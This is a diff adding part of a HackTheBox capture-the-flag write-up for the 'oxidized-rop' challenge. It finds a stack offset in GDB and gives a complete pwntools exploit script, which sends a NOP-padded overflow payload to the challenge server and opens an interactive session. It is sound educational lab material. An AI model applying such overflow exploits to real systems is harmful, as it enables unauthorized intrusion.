@@ -52,3 +52,57 @@ Our workshop is rapidly oxidizing and we want a statement on its state from ever
 
 > USING GDB
 
+```
+To identify the offset:
+
+- Starts with send 8 A's then CTRL+C.
+- Remembering PIE is enabled, find an address that ends with 11223344.
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a86723c4-2f38-43ff-87c1-cccd7763e5d8)
+
+
+14. Noticed our input not stored as 0x4141414141414141. Instead, each of them has a length of 4 bytes.
+15. At this condition the formula to calculate the offset is:
+
+```
+p (0x7fffffffdab0 - 0x7fffffffd918) / 4
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c9af6b74-8554-488d-8db3-b15422d54d5b)
+
+
+> RESULT --> 102
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a2a8543b-5672-4816-b479-2728989e36fd)
+
+
+16. Great! Let's send our payload remotely.
+
+> FULL SCRIPT
+
+```py
+from pwn import *
+
+exe = './oxidized-rop'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'INFO'
+
+# sh = process(exe)
+sh = remote('94.237.63.83',51413)
+padding = 102
+p = flat([
+    asm('nop') * padding,
+    chr(123456).encode() 
+])
+
+sh.sendlineafter(b':', b'1')
+sh.sendlineafter(b':', p)
+sh.sendlineafter(b':', b'2')
+
+# gdb.attach(sh)
+sh.interactive()
+```
+
+> RESULT
+
